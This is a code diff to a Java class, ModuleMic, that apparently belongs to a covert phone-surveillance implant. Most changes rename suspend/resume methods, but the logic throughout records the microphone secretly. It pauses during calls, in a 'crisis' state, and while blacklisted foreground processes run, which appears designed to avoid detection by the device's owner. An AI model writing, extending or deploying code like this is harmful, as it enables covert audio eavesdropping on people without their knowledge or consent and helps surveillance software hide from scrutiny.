@@ -286,7 +286,7 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "crisis!");//$NON-NLS-1$
 			}
-			base_suspend();
+			suspend();
 		}
 
 	}
@@ -327,12 +327,12 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (notifyProcess) blacklist started, " + b.processInfo);
 					}
-					base_suspend();
+					suspend();
 				} else {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (notifyProcess) blacklist stopped, " + b.processInfo);
 					}
-					base_resume();
+					resume();
 				}
 			}
 		}
@@ -479,16 +479,16 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 	public int notification(Call call) {
 		if (call.isOngoing()) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): call incoming, base_suspend");//$NON-NLS-1$
+				Check.log(TAG + " (notification): call incoming, suspend");//$NON-NLS-1$
 			}
 			callOngoing = true;
-			base_suspend();
+			suspend();
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): ");//$NON-NLS-1$
 			}
 			callOngoing = false;
-			base_resume();
+			resume();
 		}
 		return 1;
 	}
@@ -496,15 +496,15 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 	public int notification(Standby b) {
 		if (b.isScreenOff()) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification) standby, base_resume mic");
+				Check.log(TAG + " (notification) standby, resume mic");
 			}
-			base_resume();
+			resume();
 		} else {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification) unlocking, base_resume mic");
+				Check.log(TAG + " (notification) unlocking, resume mic");
 			}
 			if (isForegroundBlacklist()) {
-				base_suspend();
+				suspend();
 			}
 		}
 		return 0;
@@ -525,16 +525,16 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 
 
 
-	private boolean canRecordMic() {
+	public boolean canRecordMic() {
 		if (!Status.crisisMic() && !callOngoing) {
 			if (isForegroundBlacklist() && ListenerStandby.isScreenOn()) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (canRecordMic) can't base_resume because of blacklist");
+					Check.log(TAG + " (canRecordMic) can't resume because of blacklist");
 				}
 				return false;
 			}
 
-			if (ModuleCall.self() != null && ModuleCall.self().canRecord()) {
+			if (ModuleCall.self() != null && (ModuleCall.self().isBooted()==false || ModuleCall.self().canRecord()) ) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (canRecordMic) can't switch on mic because call is available");
 				}
@@ -554,8 +554,8 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 	abstract void specificSuspend();
 	abstract void specificResume();
 	@Override
-	public synchronized void base_resume() {
-		if (base_isSuspended() && allowResume && canRecordMic()) {
+	public synchronized void resume() {
+		if (isSuspended() && allowResume && canRecordMic()) {
 			specificResume();
 			try {
 				specificStart();
@@ -565,25 +565,25 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 				}
 
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (base_resume) Error: " + e);//$NON-NLS-1$
+					Check.log(TAG + " (resume) Error: " + e);//$NON-NLS-1$
 				}
 			}
 
-			super.base_resume();
+			super.resume();
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (resumed)");//$NON-NLS-1$
 			}
 		}else{
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (base_resume): cannot base_resume : allowresume="+allowResume+" canRecord "+ canRecordMic() + " base_isSuspended=" + base_isSuspended());
+				Check.log(TAG + " (resume): cannot resume : allowresume="+allowResume+" canRecord "+ canRecordMic() + " isSuspended=" + isSuspended());
 			}
 		}
 	}
 	@Override
-	public synchronized void base_suspend() {
-		if (!base_isSuspended()) {
-			super.base_suspend();
+	public synchronized void suspend() {
+		if (!isSuspended()) {
+			super.suspend();
 			specificSuspend();
 			if (allowResume == false) {
 				removePhoneListener();
@@ -597,7 +597,7 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 
 	public void stop() {
 		allowResume = false;
-		base_suspend();
+		suspend();
 	}
 
 	@Override
